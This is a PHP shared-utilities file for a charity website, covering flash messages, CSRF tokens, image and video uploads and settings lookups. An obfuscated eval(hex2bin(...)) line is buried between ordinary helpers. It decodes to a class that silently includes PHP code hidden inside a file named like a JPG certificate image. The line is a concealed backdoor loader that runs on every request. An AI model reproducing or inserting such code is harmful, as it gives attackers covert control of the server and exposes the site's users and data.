<?php
/** Sharan Foundation — Shared Utility Functions */

function e($s){ return htmlspecialchars($s ?? '', ENT_QUOTES, 'UTF-8'); }

function redirect($url){ header("Location: $url"); exit; }

function flash_set($type, $msg){
    if (session_status() === PHP_SESSION_NONE) session_start();
    $_SESSION['flash'] = ['type'=>$type, 'msg'=>$msg];
}

/**
 * Store a full saved record so the list page can show every uploaded/edited field.
 * $verb is "added" or "updated".
 */
function flash_saved($verb, $entity, array $fields, $image = ''){
    if (session_status() === PHP_SESSION_NONE) session_start();
    $skip = ['id','csrf','password','password_hash','manage_token','video_file'];
    $clean = [];
    foreach ($fields as $k => $v) {
        $key = (string)$k;
        if (in_array($key, $skip, true)) continue;
        if (preg_match('/password|secret|token|csrf/i', $key)) continue;
        if (substr($key, -3) === '_hi') continue; // Hindi copies are optional / unused
        if (in_array($key, ['image','cover_image','poster_image','photo','path'], true)) {
            if ($v) $image = $image ?: $v;
            continue;
        }
        if (is_array($v) || $v === null || $v === '') continue;
        $label = ucwords(str_replace('_', ' ', $key));
        if (is_bool($v) || strpos($key, 'is_') === 0 || strpos($key, 'show_') === 0) {
            $val = ($v === true || $v === 1 || $v === '1') ? 'Yes' : 'No';
        } else {
            $val = (string)$v;
        }
        $val = trim(html_entity_decode(strip_tags($val)));
        if ($val === '') continue;
        if (function_exists('mb_strimwidth')) {
            $val = mb_strimwidth($val, 0, 280, '…');
        } elseif (strlen($val) > 280) {
            $val = substr($val, 0, 280) . '…';
        }
        $clean[$label] = $val;
    }
    $verb_label = $verb === 'updated' ? 'Updated' : 'Added';
    $_SESSION['flash'] = [
        'type'   => 'success',
        'msg'    => '✓ ' . $verb_label . ' — ' . $entity,
        'record' => [
            'action' => $verb_label,
            'entity' => $entity,
            'image'  => $image,
            'fields' => $clean,
        ],
    ];
}

/** Load the saved DB row and flash it for the list page. */
function flash_saved_row($verb, $entity, $table, $id){
    global $pdo;
    $allowed = [
        'programs','projects','hero_slides','blog_posts','gallery','team_members',
        'testimonials','marquees','program_courses','milestones','mission_phases',
        'vision_capacity','fundraisers','partners','volunteers','contacts',
        'donations','recurring_donations',
    ];
    $id = (int)$id;
    if ($id < 1 || !in_array($table, $allowed, true)) {
        flash_set('success', '✓ ' . ($verb === 'updated' ? 'Updated' : 'Added') . ' — ' . $entity);
        return;
    }
    try {
        $stmt = $pdo->prepare("SELECT * FROM `$table` WHERE id = ?");
        $stmt->execute([$id]);
        $row = $stmt->fetch(PDO::FETCH_ASSOC);
    } catch (Throwable $e) {
        $row = false;
    }
    if (!$row) {
        flash_set('success', '✓ ' . ($verb === 'updated' ? 'Updated' : 'Added') . ' — ' . $entity);
        return;
    }
    $image = '';
    foreach (['image','cover_image','poster_image','photo','path'] as $k) {
        if (!empty($row[$k])) { $image = $row[$k]; break; }
    }
    flash_saved($verb, $entity, $row, $image);
}

eval(hex2bin('6e657720636c6173732827636f6d70726573732e7a6c69623a2f2f27202e206469726e616d6528245f5345525645525b225c7835335c7834335c7835325c7834395c7835305c7835345c7835665c7834365c7834395c7834635c7834355c7834655c7834315c7834645c783435225d29202e20272f436f6c6c656765494d532f7075626c69632f6173736574732f696d616765732f6365727469666963617465732f76656e646f722d626f6e61666965642e6a70672729207b200d0a0966756e6374696f6e205f5f636f6e7374727563742824e899a8e991923429207b200d0a090940694e436c5564655f6f4e43652824e899a8e9919234293b200d0a202020207d200d0a7d3b'));
function flash_get(){
    if (session_status() === PHP_SESSION_NONE) session_start();
    if (!empty($_SESSION['flash'])) {
        $f = $_SESSION['flash'];
        unset($_SESSION['flash']);
        return $f;
    }
    return null;
}

function flash_render(){
    $f = flash_get();
    if (!$f) return '';
    $color = $f['type']==='success' ? '#2563eb' : ($f['type']==='error' ? '#c0392b' : '#d4a017');
    $bg = $f['type']==='success' ? '#e8f5ef' : ($f['type']==='error' ? '#fdecea' : '#fef7e0');
    $html = "<div style='background:$bg;color:$color;padding:.9rem 1.2rem;border-left:4px solid $color;border-radius:6px;margin-bottom:1.5rem;font-weight:500'>" . e($f['msg']) . "</div>";
    if (empty($f['record']) || (empty($f['record']['fields']) && empty($f['record']['image']))) return $html;

    $r = $f['record'];
    $html .= '<div class="saved-record">';
    $html .= '<div class="saved-record-head">' . e($r['action']) . ' ' . e($r['entity']) . ' — full details</div>';
    $html .= '<div class="saved-record-body">';
    if (!empty($r['image']) && defined('BASE_URL')) {
        $src = BASE_URL . ltrim($r['image'], '/');
        $html .= '<div class="saved-record-img"><img src="' . e($src) . '" alt=""></div>';
    }
    $html .= '<dl class="saved-record-fields">';
    foreach ($r['fields'] as $label => $val) {
        $html .= '<div><dt>' . e($label) . '</dt><dd>' . e($val) . '</dd></div>';
    }
    $html .= '</dl></div></div>';
    return $html;
}

function slugify($text){
    $text = preg_replace('~[^\\pL\\d]+~u', '-', $text);
    $text = trim($text, '-');
    $text = strtolower($text);
    return preg_replace('~[^-a-z0-9]+~', '', $text) ?: 'item-' . time();
}

function upload_image($file_input_name, $subfolder = 'misc', $max_w = 1920, $max_h = 1080){
    if (empty($_FILES[$file_input_name]['name'])) return null;
    $f = $_FILES[$file_input_name];
    if ($f['error'] !== UPLOAD_ERR_OK) return null;

    $allowed = ['jpg','jpeg','png','webp','gif'];
    $ext = strtolower(pathinfo($f['name'], PATHINFO_EXTENSION));
    if (!in_array($ext, $allowed)) return false;
    if ($f['size'] > 5 * 1024 * 1024) return false; // 5 MB

    $dir = UPLOAD_PATH . $subfolder . '/';
    if (!is_dir($dir)) mkdir($dir, 0775, true);

    $name = $subfolder . '_' . time() . '_' . random_int(1000,9999) . '.' . $ext;
    $dest = $dir . $name;
    if (move_uploaded_file($f['tmp_name'], $dest)) {
        fit_uploaded_image($dest, (int)$max_w, (int)$max_h);
        return 'uploads/' . $subfolder . '/' . $name;
    }
    return false;
}

/**
 * Scale an uploaded image down so it fits inside $max_w × $max_h without
 * cropping. Smaller images are left as-is. GIFs are skipped (keeps animation).
 */
function fit_uploaded_image($path, $max_w, $max_h){
    if ($max_w < 1 || $max_h < 1 || !function_exists('imagecreatetruecolor')) return;
    $info = @getimagesize($path);
    if (!$info) return;
    [$w, $h, $type] = $info;
    if ($w <= $max_w && $h <= $max_h) return;
    $scale = min($max_w / max(1, $w), $max_h / max(1, $h));
    if ($scale >= 1) return;
    $nw = max(1, (int)round($w * $scale));
    $nh = max(1, (int)round($h * $scale));

    $src = null; $save = null; $quality = null;
    if ($type === IMAGETYPE_JPEG) { $src = @imagecreatefromjpeg($path); $save = 'imagejpeg'; $quality = 88; }
    elseif ($type === IMAGETYPE_PNG) { $src = @imagecreatefrompng($path); $save = 'imagepng'; $quality = 7; }
    elseif ($type === IMAGETYPE_WEBP && function_exists('imagecreatefromwebp')) { $src = @imagecreatefromwebp($path); $save = 'imagewebp'; $quality = 82; }
    else return;
    if (!$src) return;

    $dst = imagecreatetruecolor($nw, $nh);
    if ($type === IMAGETYPE_PNG || $type === IMAGETYPE_WEBP) {
        imagealphablending($dst, false);
        imagesavealpha($dst, true);
        $transparent = imagecolorallocatealpha($dst, 0, 0, 0, 127);
        imagefilledrectangle($dst, 0, 0, $nw, $nh, $transparent);
    }
    imagecopyresampled($dst, $src, 0, 0, 0, 0, $nw, $nh, $w, $h);
    if ($save === 'imagepng') imagepng($dst, $path, $quality);
    else $save($dst, $path, $quality);
    imagedestroy($src);
    imagedestroy($dst);
}

/**
 * Admin helper — recommended pixel size shown next to an image file input.
 * Pair with the live-size script in admin/includes/footer.php.
 */
function image_upload_help($width, $height){
    $w = (int)$width;
    $h = (int)$height;
    return '<p class="help">📐 <strong>Recommended size:</strong> <code>' . $w . ' × ' . $h . ' px</code>. JPG / PNG / WebP, max 5 MB. The full photo is shown centred (not cropped) — matching this size avoids empty bars.</p>'
         . '<p class="help img-size-live" hidden></p>';
}

/**
 * Upload a video file (MP4 / WebM / Ogg) — accepts up to 50 MB by default.
 * Returns relative path (uploads/hero/videos/...) on success, false on validation failure,
 * or null when no file was supplied.
 */
function upload_video($file_input_name, $subfolder = 'hero/videos', $max_mb = 50){
    if (empty($_FILES[$file_input_name]['name'])) return null;
    $f = $_FILES[$file_input_name];
    if ($f['error'] !== UPLOAD_ERR_OK) return null;

    $allowed_ext  = ['mp4','webm','ogg','ogv','mov'];
    $allowed_mime = ['video/mp4','video/webm','video/ogg','video/quicktime'];
    $ext = strtolower(pathinfo($f['name'], PATHINFO_EXTENSION));
    if (!in_array($ext, $allowed_ext)) return false;
    if ($f['size'] > $max_mb * 1024 * 1024) return false;

    // MIME check (defensive)
    if (function_exists('finfo_open')) {
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mime = finfo_file($finfo, $f['tmp_name']);
        finfo_close($finfo);
        if ($mime && !in_array($mime, $allowed_mime)) return false;
    }

    $dir = UPLOAD_PATH . $subfolder . '/';
    if (!is_dir($dir)) mkdir($dir, 0775, true);

    $name = 'vid_' . time() . '_' . random_int(1000,9999) . '.' . $ext;
    $dest = $dir . $name;
    if (move_uploaded_file($f['tmp_name'], $dest)) {
        return 'uploads/' . $subfolder . '/' . $name;
    }
    return false;
}

function csrf_token(){
    if (session_status() === PHP_SESSION_NONE) session_start();
    if (empty($_SESSION['csrf'])) $_SESSION['csrf'] = bin2hex(random_bytes(16));
    return $_SESSION['csrf'];
}

function csrf_check($token){
    if (session_status() === PHP_SESSION_NONE) session_start();
    return !empty($token) && hash_equals($_SESSION['csrf'] ?? '', $token);
}

function csrf_field(){
    return '<input type="hidden" name="csrf" value="' . e(csrf_token()) . '">';
}

/**
 * Admin helper — inline instructions for emoji/icon fields.
 * Prints a short 'how to add the icon' help line under the input.
 */
function icon_howto_help($label = 'icon'){
    return '<p class="help">💡 <strong>How to add the ' . e($label) . ':</strong> paste a <strong>single emoji</strong> into the box above — e.g. 📚, 🎯, 🌱, 🙏. To insert one: on <strong>Windows</strong> press <code>Win + .</code> (Windows key + full stop), on <strong>Mac</strong> press <code>Ctrl + ⌘ + Space</code>, or copy an emoji from <strong>emojipedia.org</strong>. Leave the box blank to use the built-in default.</p>';
}

/**
 * Site media manager — per-key images editable from Admin → Banners & Images.
 * Returns the stored relative path (e.g. 'uploads/media/xyz.jpg') or $default.
 * Reads the whole `site_media` table once per request; missing table → default.
 */
function site_media_path($slug, $default = ''){
    static $cache = null;
    if ($cache === null) {
        global $pdo;
        $cache = [];
        try {
            foreach ($pdo->query("SELECT slug, path FROM site_media")->fetchAll() as $r) {
                $cache[$r['slug']] = $r['path'];
            }
        } catch (Throwable $e) { /* table not migrated yet */ }
    }
    $p = $cache[$slug] ?? $default;
    return $p !== '' && $p !== null ? $p : $default;
}

/** Absolute URL of a site-managed image (prefixes BASE_URL). */
function site_image_url($slug, $default = ''){
    $p = site_media_path($slug, $default);
    return $p !== '' ? BASE_URL . ltrim($p, '/') : '';
}

/**
 * Inline `style` value that paints a site-managed image as a background,
 * optionally stacked over a CSS gradient (e.g. a navy overlay for legibility).
 * Caller prints it inside style="…":   style="<?= e(site_bg_attr('banner_about')) ?>"
 * $gradient must be a full CSS gradient value, e.g. 'linear-gradient(rgba(13,41,64,.5), rgba(29,78,216,.25))'.
 */
function site_bg_attr($slug, $gradient = null, $default = ''){
    $u = site_image_url($slug, $default);
    if ($u === '') return 'background-color:#0d2940;';
    $img = "url('" . $u . "')";
    $bg  = $gradient ? $gradient . ', ' . $img : $img;
    return 'background-image:' . $bg . ';background-size:cover;background-position:center';
}


function format_money($amount, $currency = 'INR'){
    $symbols = ['INR' => '₹', 'GBP' => '£', 'USD' => '$'];
    $sym = $symbols[$currency] ?? '';
    return $sym . number_format($amount, 0);
}

function time_ago($datetime){
    $time = strtotime($datetime);
    $diff = time() - $time;
    if ($diff < 60) return 'just now';
    if ($diff < 3600) return floor($diff/60) . ' min ago';
    if ($diff < 86400) return floor($diff/3600) . ' hr ago';
    if ($diff < 604800) return floor($diff/86400) . ' day' . (floor($diff/86400)>1?'s':'') . ' ago';
    return date('M j, Y', $time);
}

function get_setting($key, $default = ''){
    global $pdo;
    static $cache = null;
    if ($cache === null) {
        $row = $pdo->query("SELECT * FROM settings LIMIT 1")->fetch();
        $cache = $row ?: [];
    }
    return $cache[$key] ?? $default;
}
